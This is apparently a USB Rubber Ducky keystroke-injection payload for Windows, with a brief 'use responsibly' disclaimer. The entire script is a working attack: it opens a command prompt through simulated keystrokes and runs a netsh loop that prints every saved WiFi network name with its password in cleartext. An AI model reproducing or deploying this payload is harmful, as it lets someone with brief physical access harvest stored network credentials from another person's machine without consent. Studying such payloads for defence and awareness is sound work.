REM Description: This script extracts WiFi names and passwords from a Windows machine and displays them in a command prompt.
REM Note: Use responsibly and ethically. Unauthorized access to systems is illegal.

REM Opens a Command Prompt
DELAY 500
GUI r
DELAY 1000
STRING cmd
ENTER
DELAY 1000
STRING cls
ENTER
STRING for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | netsh wlan show profiles %j key=clear | findstr /C:"SSID name" /C:"Key Content"
ENTER
